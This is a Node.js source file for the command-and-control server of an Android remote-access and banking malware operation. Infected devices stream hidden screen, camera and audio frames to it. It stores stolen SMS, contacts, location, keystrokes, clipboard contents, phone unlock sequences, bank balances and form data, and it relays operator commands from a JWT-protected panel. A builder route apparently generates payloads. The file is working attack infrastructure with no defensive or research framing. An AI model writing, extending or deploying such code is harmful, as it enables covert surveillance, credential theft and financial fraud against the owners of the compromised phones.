'use strict';
require('dotenv').config();

const path      = require('path');
const express   = require('express');
const http      = require('http');
const WebSocket = require('ws');
const cors      = require('cors');
const jwt       = require('jsonwebtoken');
const { v4: uuidv4 } = require('uuid');
const db        = require('./db/database');
const authRoutes    = require('./routes/auth');
const builderRoutes = require('./routes/builder');
const { authMiddleware } = require('./middleware/auth');

const PORT          = process.env.PORT || 3000;
const DEVICE_SECRET = process.env.DEVICE_SECRET || '';
const FRONTEND_DIST = path.join(__dirname, '..', 'frontend', 'dist');

// ─── Keepalive tuning ─────────────────────────────────────────────────────────
// Render (and most cloud proxies) kill idle TCP after ~60s.
// We ping every 20s to keep the connection warm.
// If a socket misses 3 pongs (60s), we reap it as dead.

const PING_INTERVAL     = 20_000;   // ms between protocol pings
const PONG_TIMEOUT      = 60_000;   // ms before declaring a socket dead
const MAX_MISSED_PONGS  = 3;

// ─── Express ─────────────────────────────────────────────────────────────────

const app = express();
app.use(cors({ origin: '*' }));
app.use(express.json({ limit: '50mb' }));

const server = http.createServer(app);

// ─── WebSocket servers ────────────────────────────────────────────────────────
// /ws    → Android devices  (CCS binary + JSON protocol)
// /panel → Browser panel    (JSON protocol, JWT auth)

const deviceWss = new WebSocket.Server({ noServer: true, maxPayload: 50 * 1024 * 1024 });
const panelWss  = new WebSocket.Server({ noServer: true });

// Live device registry: deviceId → { ws, ip, info, lastPing, missedPongs }
const deviceMap  = new Map();
// Authenticated panel sockets: ws → { lastPing, missedPongs }
const panelConns = new Map();

// ─── HTTP upgrade routing ─────────────────────────────────────────────────────

server.on('upgrade', (req, socket, head) => {
  const url  = new URL(req.url, 'http://x');
  const p    = url.pathname;

  if (p === '/ws') {
    deviceWss.handleUpgrade(req, socket, head, ws =>
      deviceWss.emit('connection', ws, req)
    );
  } else if (p === '/panel') {
    panelWss.handleUpgrade(req, socket, head, ws =>
      panelWss.emit('connection', ws, req)
    );
  } else {
    socket.write('HTTP/1.1 404 Not Found\r\nConnection: close\r\n\r\n');
    socket.destroy();
  }
});

// ─── Panel broadcast helpers ──────────────────────────────────────────────────

function toPanel(obj) {
  const s = JSON.stringify(obj);
  panelConns.forEach((meta, ws) => {
    if (ws.readyState === WebSocket.OPEN) ws.send(s);
  });
}

function toPanelBinary(buf) {
  panelConns.forEach((meta, ws) => {
    if (ws.readyState === WebSocket.OPEN) ws.send(buf);
  });
}

// ─── Keepalive engine ─────────────────────────────────────────────────────────

function startKeepalive(wss, connMap, label) {
  const timer = setInterval(() => {
    const now = Date.now();

    wss.clients.forEach(ws => {
      if (ws.readyState !== WebSocket.OPEN) return;

      const meta = connMap.get(ws);
      if (!meta) return;

      // Check for dead socket — missed too many pongs
      if (now - meta.lastPing > PONG_TIMEOUT && meta.missedPongs >= MAX_MISSED_PONGS) {
        console.log(`[${label}] Reaping dead socket (missed ${meta.missedPongs} pongs)`);
        ws.terminate(); // Force close — triggers 'close' event
        return;
      }

      // Count this ping as potentially missed if we haven't seen a pong
      if (meta.missedPongs > 0 && now - meta.lastPong > PING_INTERVAL * 2) {
        meta.missedPongs++;
      } else {
        meta.missedPongs = 0;
      }

      // Send protocol ping
      try {
        ws.ping();
        meta.lastPing = now;
      } catch {
        ws.terminate();
      }
    });
  }, PING_INTERVAL);

  timer.unref(); // Don't keep process alive just for pings
  return timer;
}

// Track pongs on both namespaces
deviceWss.on('pong', (ws) => {
  const meta = panelConns.get(ws); // check panel first (same ws object won't be in both, but be safe)
  // Find which map has this ws
  for (const [id, entry] of deviceMap) {
    if (entry.ws === ws) {
      entry.missedPongs = 0;
      entry.lastPong = Date.now();
      return;
    }
  }
});

panelWss.on('pong', (ws) => {
  const meta = panelConns.get(ws);
  if (meta) {
    meta.missedPongs = 0;
    meta.lastPong = Date.now();
  }
});

// Start keepalive timers
startKeepalive(deviceWss, panelConns, 'DEVICE');
startKeepalive(panelWss, panelConns, 'PANEL');

// ─── /ws — Device namespace ───────────────────────────────────────────────────

deviceWss.on('connection', (ws, req) => {
  const url  = new URL(req.url, 'http://x');
  const ip   = (req.headers['x-forwarded-for'] || '').split(',')[0].trim()
             || req.socket.remoteAddress || '';

  // CCS puts device_id in query param immediately on connect
  let deviceId = url.searchParams.get('device_id') || null;
  let registered = false;

  // Track connection metadata for keepalive
  const connMeta = { lastPing: Date.now(), lastPong: Date.now(), missedPongs: 0 };
  panelConns.set(ws, connMeta); // reuse panelConns map for keepalive tracking

  // Auth timeout — close if no DEVICE_INFO within 15s
  const authTimer = setTimeout(() => {
    if (!registered) ws.close(4001, 'no registration');
  }, 15000);

  // ── Message handler ─────────────────────────────────────────────────────────
  ws.on('message', async (data, isBinary) => {

    // Binary = HVNC screen/camera/audio frame
    // Protocol: [type:1][size:4 BE][payload]
    // type 0x01=screen, 0x02=camera, 0x03=audio
    if (isBinary) {
      if (!deviceId) return;
      try {
        const buf  = Buffer.isBuffer(data) ? data : Buffer.from(data);
        if (buf.length < 5) return;

        const frameType = buf[0];
        const size      = buf.readUInt32BE(1);
        const payload   = buf.slice(5, 5 + size);

        // Forward to panel: [frameType:1][devIdLen:2][devId:UTF8][payload]
        const devIdBuf  = Buffer.from(deviceId, 'utf8');
        const header    = Buffer.allocUnsafe(3);
        header[0]       = frameType;
        header.writeUInt16BE(devIdBuf.length, 1);
        toPanelBinary(Buffer.concat([header, devIdBuf, payload]));

        // Update last_seen on activity
        const now = Date.now();
        if (!ws._lastSeenUpdate || now - ws._lastSeenUpdate > 5000) {
          ws._lastSeenUpdate = now;
          db.query('UPDATE devices SET last_seen = NOW() WHERE id = $1', [deviceId]).catch(() => {});
        }
      } catch (e) {
        // malformed binary — ignore silently
      }
      return;
    }

    // ── Text JSON frame ────────────────────────────────────────────────────────
    let msg;
    try { msg = JSON.parse(data.toString()); } catch { return; }

    const msgType = (msg.type || '').toString().toUpperCase();

    // ── Device registration ──────────────────────────────────────────────────
    if (msgType === 'DEVICE_INFO') {
      clearTimeout(authTimer);
      registered = true;

      // Prefer query-param device_id; fall back to message body
      deviceId = deviceId || msg.device_id || uuidv4();

      // If this device already has a live connection, kill the old one
      const existing = deviceMap.get(deviceId);
      if (existing && existing.ws !== ws && existing.ws.readyState === WebSocket.OPEN) {
        console.log(`[DEVICE] Duplicate connection for ${deviceId} — killing old socket`);
        existing.ws.terminate();
      }

      deviceMap.set(deviceId, {
        ws,
        ip,
        info: msg,
        lastPing: Date.now(),
        lastPong: Date.now(),
        missedPongs: 0,
      });

      // Store in DB
      await db.upsertDevice(deviceId, msg, ip).catch(() => {});

      // Flush queued pending commands
      const pending = await db.getCommands(deviceId, 50).catch(() => []);
      for (const cmd of pending.filter(c => c.status === 'pending')) {
        if (ws.readyState === WebSocket.OPEN) {
          const payload = { action: cmd.action, ...(cmd.params || {}) };
          ws.send(JSON.stringify(payload));
          await db.updateCommand(cmd.id, 'sent').catch(() => {});
        }
      }

      // Notify panel
      toPanel({
        type: 'device_connected',
        deviceId,
        info: msg,
        ip,
        timestamp: Date.now(),
      });

      console.log(`[DEVICE] Registered: ${deviceId} (${msg.manufacturer} ${msg.model}) from ${ip}`);
      return;
    }

    if (!deviceId) return; // drop messages before we have an id

    // ── Heartbeat PING → respond PONG ────────────────────────────────────────
    if (msgType === 'PING') {
      ws.send(JSON.stringify({ type: 'PONG', timestamp: Date.now() }));
      return;
    }

    // ── All other messages: route to panel + save to DB ───────────────────────
    const TYPE_TO_DB = {
      'SMS':             'sms',
      'CONTACTS':        'contacts',
      'LOCATION':        'location',
      'INSTALLED_APPS':  'apps',
      'KEYLOG':          'keylog',
      'KEYLOG_OFFLINE':  'keylog',
      'CAMERA_FRAME':    'photo',
      'AUDIO_CHUNK':     'audio',
      'CLIPBOARD':       'clipboard',
      'SCREEN_HIERARCHY':'screen_hierarchy',
      'UNLOCK_SEQUENCE': 'unlock_sequence',
      'BANK_BALANCE':    'bank_balance',
      'STUDIO_FORM_DATA':'form_data',
    };

    const dbType = TYPE_TO_DB[msgType];
    if (dbType) {
      await db.saveData(deviceId, dbType, msg).catch(() => {});
    }

    // DEVICE_STATUS → update device record
    if (msgType === 'DEVICE_STATUS') {
      await db.query(
        'UPDATE devices SET current_app = $1, app_name = $2, is_locked = $3, is_screen_on = $4, last_seen = NOW() WHERE id = $5',
        [msg.package || '', msg.appName || '', msg.isLocked ?? false, msg.isScreenOn ?? true, deviceId]
      ).catch(() => {});
    }

    // Forward everything to panel
    toPanel({
      type: 'device_data',
      deviceId,
      msgType,
      data: msg,
      timestamp: Date.now(),
    });
  });

  // ── Disconnect ─────────────────────────────────────────────────────────────
  ws.on('close', async () => {
    clearTimeout(authTimer);
    panelConns.delete(ws); // clean keepalive tracking

    if (deviceId) {
      // Only mark offline if this ws is the current registered one
      const entry = deviceMap.get(deviceId);
      if (entry && entry.ws === ws) {
        deviceMap.delete(deviceId);
        await db.setDeviceOffline(deviceId).catch(() => {});
        toPanel({ type: 'device_disconnected', deviceId });
        console.log(`[DEVICE] Disconnected: ${deviceId}`);
      }
    }
  });

  ws.on('error', err => {
    if (err.code !== 'ECONNRESET') console.error(`[DEVICE] ${deviceId}: ${err.message}`);
  });
});

// ─── /panel — Panel namespace ─────────────────────────────────────────────────

panelWss.on('connection', ws => {
  let authed = false;

  // Track for keepalive
  const connMeta = { lastPing: Date.now(), lastPong: Date.now(), missedPongs: 0 };
  panelConns.set(ws, connMeta);

  const authTimer = setTimeout(() => {
    if (!authed) ws.close(4001, 'auth timeout');
  }, 10000);

  ws.on('message', async data => {
    let msg;
    try { msg = JSON.parse(data.toString()); } catch { return; }

    // ── Auth ─────────────────────────────────────────────────────────────────
    if (msg.type === 'auth') {
      try {
        jwt.verify(msg.token, process.env.JWT_SECRET);
        clearTimeout(authTimer);
        authed = true;
        ws.send(JSON.stringify({ type: 'auth_ok' }));

        // Push device list + mark which are live
        const devices = await db.getDevices().catch(() => []);
        const withOnline = devices.map(d => ({ ...d, online: deviceMap.has(d.id) }));
        ws.send(JSON.stringify({ type: 'devices', data: withOnline }));

        console.log('[PANEL] Admin connected');
      } catch {
        ws.close(4001, 'invalid token');
      }
      return;
    }

    if (!authed) return;

    // ── Refresh devices ───────────────────────────────────────────────────────
    if (msg.type === 'get_devices') {
      const devices = await db.getDevices().catch(() => []);
      ws.send(JSON.stringify({ type: 'devices', data: devices.map(d => ({ ...d, online: deviceMap.has(d.id) })) }));
      return;
    }

    // ── Send command to device ────────────────────────────────────────────────
    if (msg.type === 'send_command') {
      const { deviceId, action, ...rest } = msg;
      delete rest.type;
      if (!deviceId || !action) return;

      const cmdId = uuidv4();

      // Persist command
      const params = {};
      Object.keys(rest).forEach(k => { params[k] = rest[k]; });
      await db.saveCommand(cmdId, deviceId, action, params).catch(() => {});

      const entry = deviceMap.get(deviceId);
      if (entry && entry.ws.readyState === WebSocket.OPEN) {
        const payload = JSON.stringify({ action, ...params });
        entry.ws.send(payload);
        await db.updateCommand(cmdId, 'sent').catch(() => {});
        ws.send(JSON.stringify({ type: 'command_sent', cmdId, status: 'sent', action }));
      } else {
        ws.send(JSON.stringify({ type: 'command_sent', cmdId, status: 'queued', action }));
      }
    }
  });

  ws.on('close', () => {
    clearTimeout(authTimer);
    panelConns.delete(ws);
    console.log('[PANEL] Admin disconnected');
  });

  ws.on('error', err => console.error('[PANEL]', err.message));
});

// ─── REST API ─────────────────────────────────────────────────────────────────

app.get('/health', (_req, res) =>
  res.json({
    ok: true,
    uptime: process.uptime(),
    devices: deviceMap.size,
    panel: panelConns.size,
    timestamp: Date.now(),
  })
);

app.use('/api/auth', authRoutes);
app.use('/api/builder', authMiddleware, builderRoutes);

// Helper: send command to device
async function dispatchCommand(deviceId, action, params = {}) {
  const cmdId = uuidv4();
  await db.saveCommand(cmdId, deviceId, action, params).catch(() => {});
  const entry = deviceMap.get(deviceId);
  if (entry && entry.ws.readyState === WebSocket.OPEN) {
    entry.ws.send(JSON.stringify({ action, ...params }));
    await db.updateCommand(cmdId, 'sent').catch(() => {});
    return { cmdId, status: 'sent' };
  }
  return { cmdId, status: 'queued' };
}

// All /api/* require auth
app.use('/api', authMiddleware, async (req, res) => {
  const parts = req.path.split('/').filter(Boolean);

  try {
    // GET /api/devices
    if (req.method === 'GET' && parts[0] === 'devices' && !parts[1]) {
      const rows = await db.getDevices();
      return res.json(rows.map(d => ({ ...d, online: deviceMap.has(d.id) })));
    }

    // GET /api/devices/:id
    if (req.method === 'GET' && parts[0] === 'devices' && parts[1] && !parts[2]) {
      const row = await db.getDevice(parts[1]);
      if (!row) return res.status(404).json({ error: 'Not found' });
      return res.json({ ...row, online: deviceMap.has(row.id) });
    }

    // PATCH /api/devices/:id
    if (req.method === 'PATCH' && parts[0] === 'devices' && parts[1] && !parts[2]) {
      await db.updateDeviceAlias(parts[1], req.body.alias || '');
      return res.json({ ok: true });
    }

    // GET /api/devices/:id/data/:type
    if (req.method === 'GET' && parts[0] === 'devices' && parts[2] === 'data' && parts[3]) {
      const limit = Math.min(parseInt(req.query.limit) || 100, 500);
      return res.json(await db.getData(parts[1], parts[3], limit));
    }

    // POST /api/devices/:id/cmd
    if (req.method === 'POST' && parts[0] === 'devices' && parts[2] === 'cmd') {
      const { action, params: nestedParams, ...rest } = req.body;
      if (!action) return res.status(400).json({ error: 'action required' });
      const allParams = { ...(nestedParams || {}), ...rest };
      return res.json(await dispatchCommand(parts[1], action, allParams));
    }

    // GET /api/devices/:id/commands
    if (req.method === 'GET' && parts[0] === 'devices' && parts[2] === 'commands') {
      return res.json(await db.getCommands(parts[1], 50));
    }

    return res.status(404).json({ error: 'Not found' });
  } catch (err) {
    console.error('[API]', err.message);
    res.status(500).json({ error: err.message });
  }
});

// Global error handler
app.use('/api', (err, _req, res, _next) => {
  console.error('[API]', err.message);
  res.status(500).json({ error: 'Internal error' });
});

// Serve frontend
app.use(express.static(FRONTEND_DIST));
app.get('*', (_req, res) => res.sendFile(path.join(FRONTEND_DIST, 'index.html')));

// ─── Graceful shutdown ────────────────────────────────────────────────────────

process.on('SIGTERM', () => {
  console.log('[SERVER] SIGTERM — shutting down');
  // Close all live connections gracefully
  deviceWss.clients.forEach(ws => ws.close(1001, 'server shutdown'));
  panelWss.clients.forEach(ws => ws.close(1001, 'server shutdown'));
  server.close(() => process.exit(0));
  setTimeout(() => process.exit(1), 25000);
});

process.on('SIGINT', () => {
  console.log('[SERVER] SIGINT — shutting down');
  deviceWss.clients.forEach(ws => ws.close(1001, 'server shutdown'));
  panelWss.clients.forEach(ws => ws.close(1001, 'server shutdown'));
  server.close(() => process.exit(0));
  setTimeout(() => process.exit(1), 25000);
});

// ─── Boot ─────────────────────────────────────────────────────────────────────

db.init()
  .then(() => {
    server.listen(PORT, '0.0.0.0', () => {
      console.log(`[SERVER] ✓ Listening :${PORT}`);
      console.log(`[SERVER] Device WS → ws://host:${PORT}/ws`);
      console.log(`[SERVER] Panel  WS → ws://host:${PORT}/panel`);
      console.log(`[SERVER] Keepalive: ping every ${PING_INTERVAL / 1000}s, reap after ${PONG_TIMEOUT / 1000}s`);
    });
  })
  .catch(err => {
    console.error('[SERVER] DB init failed:', err.message);
    process.exit(1);
  });
